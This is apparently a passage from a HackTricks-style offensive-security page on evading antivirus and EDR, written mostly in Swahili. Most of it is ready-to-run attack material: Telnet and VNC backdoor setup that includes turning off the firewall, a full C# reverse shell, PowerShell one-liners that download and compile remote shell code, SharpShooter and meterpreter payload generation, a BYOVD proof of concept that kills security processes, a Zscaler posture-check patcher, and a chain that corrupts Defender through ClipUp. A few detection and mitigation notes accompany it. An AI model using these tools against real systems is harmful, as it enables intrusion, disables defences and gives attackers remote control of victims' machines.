Evasion ni mada ngumu sana, wakati mwingine unahitaji kuzingatia vyanzo vingi tofauti vya telemetry ndani ya mfumo mmoja, hivyo kwa kawaida haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyokomaa.

Kila mazingira utakayokutana nayo itakuwa na nguvu na udhaifu wake wenyewe.

Ninakuhimiza uangalie hotuba hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata ufahamu wa mbinu zaidi za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni hotuba nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo ita **ondoa sehemu za binary** mpaka itakapogundua ni **sehemu gani Defender** inaona kama ya kibaya na ikigawanye kwako.\
Zana nyingine inafanya **kazi hiyo hiyo ni** [**avred**](https://github.com/dobin/avred) yenye huduma wazi mtandaoni kwenye [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilitoka na **Telnet server** ambayo unaweza kusakinisha (kama administrator) ukifanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fanya **ianze** wakati mfumo unapoanzishwa na **ikimbie** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha bandari ya telnet** (isiyogundulika) na zima firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka bin downloads, sio setup)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Washa chaguo _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **mpya** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Ili kudumisha stealth, lazima usifanye mambo kadhaa

- Usianze `winvnc` ikiwa tayari inaendeshwa au utaamsha a [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inaendeshwa na `tasklist | findstr winvnc`
- Usianze `winvnc` bila `UltraVNC.ini` katika directory moja au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usiendeshe `winvnc -h` kwa msaada au utaamsha a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anzisha lister** na `msfconsole -r file.rc` na **endesha** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa atakata mchakato kwa haraka sana.**

### Kucompile reverse shell yetu

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### C# Revershell ya kwanza

I-compile kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kwa kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Kupakua na kutekeleza kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuondoa AV/EDR kutoka Kernel Space

Storm-2603 ilitumia utiliti ndogo ya console inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kuachia ransomware. Zana hii inaleta **driver yake mwenyewe iliyo hatarishi lakini *iliyosasishwa*** na kuilimbikiza kuitumia kutoa operesheni za kipekee za kernel ambazo hata huduma za Protected-Process-Light (PPL) AV hazina uwezo wa kuzizuia.

Mambo ya kuzingatia
1. **Driver iliyosainiwa**: Faili iliyowekwa kwenye disk ni `ServiceMouse.sys`, lakini binary ni driver halali iliyosasishwa `AToolsKrnl64.sys` kutoka kwa Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa sababu driver ina saini halali ya Microsoft inaweza kupakiwa hata wakati Driver-Signature-Enforcement (DSE) iko kwenye nguvu.
2. **Usakinishaji wa service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unasajili driver kama **kernel service** na wa pili unaanza ili `\\.\ServiceMouse` iweze kupatikana kutoka user land.
3. **IOCTLs zilizofichuliwa na driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Kumaliza mchakato wowote kwa PID (ilitumika kuua Defender/EDR services) |
| `0x990000D0` | Kufuta faili yoyote kwenye disk |
| `0x990001D0` | Kutupilia mbali driver na kuondoa service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Kwa nini inafanya kazi**: BYOVD inapuuzia ulinzi wa user-mode kabisa; nambari inayotekelezwa kwenye kernel inaweza kufungua michakato *iliyo na ulinzi*, kuiweka kifupi, au kushughulikia vitu vya kernel bila kujali PPL/PP, ELAM au vipimo vingine vya kuimarisha.

Detection / Mitigation
•  Washa orodha ya kuzuia driver zilizo hatarishi za Microsoft (`HVCI`, `Smart App Control`) ili Windows ikaue kupakia `AToolsKrnl64.sys`.
•  Monitor uundwaji wa services mpya za *kernel* na toa tahadhari wakati driver inapakiwa kutoka kwenye saraka inayoandikwa na kila mtu (world-writable) au haipo kwenye orodha ya kuruhusiwa.
•  Angalia kwa handles za user-mode kwa custom device objects zikiambatana na simu za kushuku za `DeviceIoControl`.

### Kupitisha Posture Checks za Zscaler Client Connector kupitia On-Disk Binary Patching

Zscaler’s **Client Connector** inatekeleza sheria za device-posture kwa upande wa mteja na inategemea Windows RPC kuwasiliana matokeo kwa sehemu nyingine. Uchaguzi mbili dhaifu za muundo zinaleta uwezo wa kupitisha kabisa:

1. Tathmini ya posture hufanyika **kama client-side pekee** (boolean hupelekwa kwa server).
2. Endpoints za ndani za RPC zinathibitisha tu kwamba executable inayounganisha ime **sainiwa na Zscaler** (kupitia `WinVerifyTrust`).

Kwa **kuchezea binaries nne zilizosasishwa kwenye disk** mbinu zote mbili zinaweza kuzimwa:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Huarudi `1` kila mara hivyo kila ukaguzi unakuwa compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ mchakato wowote (hata usiosainiwa) unaweza kuungana kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Imereplaced na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Imefupishwa/short-circuited |

Sehemu ndogo ya patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za asili na kuanzisha upya service stack:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

Kesi hii ya mtihani inaonyesha jinsi maamuzi ya uaminifu upande wa mteja pekee na ukaguzi rahisi wa saini yanavyoweza kushindwa kwa few byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) inatekeleza hieraki ya signer/ngazi hivyo mchakato uliolindwa wa ngazi sawa au ya juu tu ndio unaweza kuingilia mchakato mwingine. Kwa matumizi ya kushambulia, ikiwa unaweza kuanzisha kwa halali binary yenye PPL na kudhibiti hoja zake, unaweza kubadilisha kazi zisizo hatari (mfano, logging) kuwa primitive ya kuandika yenye mipaka, inayotolewa na PPL, dhidi ya directories zilizo na ulinzi zinazotumiwa na AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` inaanzisha mwenyewe na inakubali parameter ya kuandika faili la log kwenye path iliyoainishwa na mwito.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp haiwezi kuchambua paths zenye nafasi; tumia 8.3 short paths kuelekeza kwenye maeneo ambayo kwa kawaida yalindwa.

8.3 short path helpers
- Orodhesha majina mafupi: `dir /x` katika kila parent directory.
- Pata njia fupi katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Anzisha the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` ukitumia launcher (mf., CreateProcessAsPPL).
2) Pitia ClipUp log-path argument ili kulazimisha uundaji wa faili katika protected AV directory (mf., Defender Platform). Tumia 8.3 short names ikiwa inahitajika.
3) Ikiwa target binary kwa kawaida iko wazi/imefungwa na AV wakati wa kukimbia (mf., MsMpEng.exe), panga uandishi kufanyika wakati wa boot kabla AV haijaanza kwa kusakinisha auto-start service ambayo inaendeshwa mapema kwa uhakika. Thibitisha boot ordering kwa Process Monitor (boot logging).
4) Kufuatia reboot, uandishi ulioungwa mkono na PPL hutokea kabla AV haijafunga binaries zake, ukiharibu target file na kuzuia startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Huwezi kudhibiti yaliyomo ambayo ClipUp inaandika zaidi ya mahali pa kuweka; mbinu hii inafaa kwa kuharibu badala ya sindano sahihi ya yaliyomo.
- Inahitaji local admin/SYSTEM kusanidi/kuanza service na dirisha la kuanzisha upya.
- Wakati ni muhimu: lengo halipaswi kuwa wazi; utekelezaji wakati wa boot huzuia file locks.

Detections
- Uundaji wa mchakato wa `ClipUp.exe` na hoja zisizo za kawaida, hasa ukiwa mzazi wa launchers zisizo za kawaida, karibu na boot.
- Services mpya zilizosanidiwa kuanza auto-start binaries za kutiliwa shaka na kuanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya kushindwa kwa kuanzisha Defender.
- Ufuatiliaji wa uadilifu wa faili kwenye Defender binaries/Platform directories; uundaji/urekebishaji wa faili usiotarajiwa na michakato yenye bendera za protected-process.
- ETW/EDR telemetry: tafuta michakato iliyoumbwa kwa `CREATE_PROTECTED_PROCESS` na matumizi ya kiwango cha PPL isiyo ya kawaida na binaries zisizo za AV.

Mitigations
- WDAC/Code Integrity: zuia ni binaries zipi zilizosainiwa zinaweza kuendeshwa kama PPL na chini ya wazazi gani; zuia kuitwa kwa ClipUp nje ya muktadha halali.
- Service hygiene: zuia uundaji/urekebishaji wa services za auto-start na fuatilia uchezaji wa mpangilio wa kuanzisha.
- Hakikisha Defender tamper protection na early-launch protections zimeshawashwa; chunguza makosa ya kuanzisha yanayoonyesha uharibifu wa binary.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazohifadhi security tooling ikiwa inafaa kwa mazingira yako (test thoroughly).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
